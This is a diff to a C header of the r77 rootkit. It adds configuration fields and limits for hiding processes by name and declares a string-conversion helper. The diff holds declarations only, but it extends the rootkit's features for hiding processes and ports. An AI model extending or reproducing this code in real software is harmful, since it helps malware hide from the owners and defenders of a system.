@@ -53,7 +53,11 @@
 /// <summary>
 /// The maximum number of processes that can be hidden by ID.
 /// </summary>
-#define R77_CONFIG_MAX_HIDDEN_PROCESS_IDS		1000
+#define R77_CONFIG_MAX_HIDDEN_PROCESS_IDS		100
+/// <summary>
+/// The maximum number of processes that can be hidden by name.
+/// </summary>
+#define R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES		100
 /// <summary>
 /// The maximum number of local TCP ports that can be hidden.
 /// </summary>
@@ -124,6 +128,14 @@ typedef struct _R77_CONFIG
 	/// </summary>
 	LPDWORD HiddenProcessIds;
 	/// <summary>
+	/// The number of process names to hide.
+	/// </summary>
+	DWORD HiddenProcessNameCount;
+	/// <summary>
+	/// An array of process names to hide in addition to processes hidden by the prefix.
+	/// </summary>
+	LPWSTR *HiddenProcessNames;
+	/// <summary>
 	/// The number of hidden local TCP ports.
 	/// </summary>
 	DWORD HiddenTcpLocalPortCount;
@@ -175,6 +187,14 @@ VOID InitializeApi(DWORD flags);
 /// <param name="str">A buffer of unicode characters to write the string to.</param>
 /// <param name="length">The number of characters to write.</param>
 VOID RandomString(PWCHAR str, DWORD length);
+/// <summary>
+/// Converts a UNICODE_STRING into a null terminated LPWSTR.
+/// </summary>
+/// <param name="str">The UNICODE_STRING to convert.</param>
+/// <returns>
+/// A newly allocated LPWSTR with the converted UNICODE_STRING.
+/// </returns>
+LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str);
 /// <summary>
 /// Determines whether the operating system is a 64-bit operating system.
 /// </summary>
